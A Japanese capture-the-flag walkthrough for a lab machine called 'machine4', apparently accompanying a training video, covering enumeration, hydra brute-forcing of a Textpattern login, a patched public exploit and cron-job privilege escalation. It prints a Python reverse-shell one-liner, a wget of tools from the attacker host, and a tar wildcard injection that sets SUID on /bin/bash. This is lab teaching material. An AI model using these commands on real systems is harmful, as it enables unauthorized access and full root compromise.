machine4で学べることは以下のことです。

- hydraを用いたブルートフォース攻撃
- public exploitのトラブルシューティング
- cron jobを悪用した権限昇格
- おすすめ視聴タイミング: Learning Path終盤

※動画内で使用したhydraのコマンドで誤字があります。詳細は攻略の流れを確認してください。

### 攻略の流れ
Enumeration
nmapを用いてportscanを行います。
```
$ nmap machine4
```
開いていることがわかったポートに対してより詳細なスキャンを-sVオプションと-sCオプションをつけて行います。
```
$ nmap -p22,80 -sC -sV machine4
```
ポートの見落としを避けるためにフルポートスキャンを行います。
```
$ nmap -p- machine4
```
ブラウザでアクセスするとapacheのデフォルトページが表示されます。

ソースコードにも特に情報がないので、gobusterなどのツールを用いてディレクトリの列挙を行います。

動作させるモードとしてdirを指定、-uオプションでurlを指定、-wオプションで使用するワードリストを指定します。
```
gobuster dir -u http://machine4/ -w /usr/share/wordlists/dirb/common.txt
```
見つかったディレクトリからさらにgobusterを使って調査を進めるとtextpatternというディレクトリが見つかり、アクセスするとアプリが動作しています。
```
$ gobuster dir -u http://machine4/app -w /usr/share/wordlists/dirb/common.txt
```
```
$ gobuster dir -u http://machine4/textpattern -w /usr/share/wordlists/dirb/common.txt
```
textpatternというアプリについて調査するとexploitが見つかりますが、バージョン情報等がわからないため有効かどうかの判断ができません。

gobusterで見つかった他のディレクトリにアクセスすると認証ページが見つかりますが、簡単な認証情報ではログインできないため、hydraを使ったブルートフォース攻撃を行います.
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt [RHOST] http-post-form "[url]:[post]:[error]" -V
```
hydraのオプションを解説します。

-l  
ユーザーネームです。-Lでファイルを指定することで複数のユーザーネームを指定することも可能です。  
-P  
パスワードに使用するワードリストです。-pにすることで特定のパスワードを指定することも可能です。  
[RHOST]  
ターゲットのipアドレスもしくはホスト名です。  
http-post-form  
ターゲットのプロトコルを指定します。他にftpやsshなどがあります。  
"[url]:[post]:[error]"    
認証ページへのパス、送信するデータ、ログインに失敗したことを判定できる文字列を順番に指定します。 ユーザーネームとパスワードが入る場所は^USER^と^PASS^に置き換えます。  
burp suiteなどを用いて実行するコマンドを作成します。(動画内のコマンドはエラー文が間違っています。下記コマンドが正しいコマンドです。)
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt machine4 http-post-form "/app/textpattern/textpattern/index.php:lang=en&p_userid=^USER^&p_password=^PASS^&_txp_token=:Could not log in" -V
```
少し待つとブルートフォース攻撃が成功し、admin:monkeyでログインできることがわかります。

ログインして少し調査すると、バージョンが4.8.2であることがわかります。

4.8.2のexploitを探しますが見つからないので、4.8に関するexploitを探すと4.8.3に対するexploitが複数見つかります。
```
$ searchsploit 4.8.2
$ searchsploit 4.8
```
Initial Shell
見つかったexploitをいくつか読み、成功しそうなものの一つを実行しますが、成功しません。

再度、exploitが何をしているかを確認してどこで失敗しているかを調査します。

調査の結果、ファイルのアップロードとphpの実行は成功していることがわかるため、アップロードするファイルの内容を更新して再度exploitを実行します。

今回は使用する関数をsystem関数からpassthru関数に変更しました。
```
$ ./48943.py http://machine4/app/textpattern/ admin monkey
```
exploitが成功し、webshellを通じてコマンドが実行できるようになりました。

次に、python3を使ってリバースシェルを獲得します。

ncコマンドでシェルを待ち受けてからコマンドを実行します。
```
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
### Enumeration(権限昇格)
シェルのアップグレードを行ってから権限昇格の列挙を行います。   
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'  
(Ctrl+z)  
$ stty raw -echo;fg  
(Enter)  
(Enter)  
$ export TERM=xterm  
```
権限昇格のための列挙では様々なツールが使えますが、今回はpspyというツールを使います。

pspyは実行されているプロセスを監視することができるツールで、githubからダウンロードすることができます。

ダウンロードしたpspyをターゲットマシンに転送して実行すると実行されているプロセスの情報が出力され、新しいプロセスが動作すると随時更新されます。
```
$ wget http://[LHOST]/pspy
$ chmod +x pspy
$ ./pspy
```
しばらく待つと、tarコマンドがroot権限で実行されます。

このtarコマンドではウェブアプリのバックアップを取っているようです。

tarコマンドを使って権限昇格を行う方法がないか調査するとtarとwildcardを使って権限昇格を行うテクニックが見つかります。

新しくファイルを作成してしばらく待つとそのファイルも含めて圧縮されるため、wildcardが使われていることがわかります。

#### Privilege Escalation
tarコマンドがwildcardを用いて実行されているため、先ほど発見した権限昇格のテクニックを実践します。

exploitの内容は/bin/bashにSUIDを設定するものです。

実行したあとpspyを実行し、tarコマンドが実行されるのを待ちます。
```
$ echo '#!/bin/bash\nchmod +s /bin/bash' &gt; shell.sh
$ echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
$ echo "" &gt; --checkpoint=1
$ ./pspy
```
tarコマンドが実行されたあとに/bin/bashを確認します。
```
$ ls -la /bin/bash
```
SUIDが設定されていないので、exploitが失敗していることがわかります。

pspyの出力を確認するとshell.shは確かに実行されているので、shell.shの内容を確認します。
```
$ cat shell.sh
```
改行コードがそのまま入力され、無効なシェルスクリプトになっているので失敗したようです。

shell.shを修正してtarコマンドが実行されるのを待つとSUIDが設定されます。

SUIDが設定された/bin/bashを実行するとroot権限になれます。
```
$ /bin/bash -p
```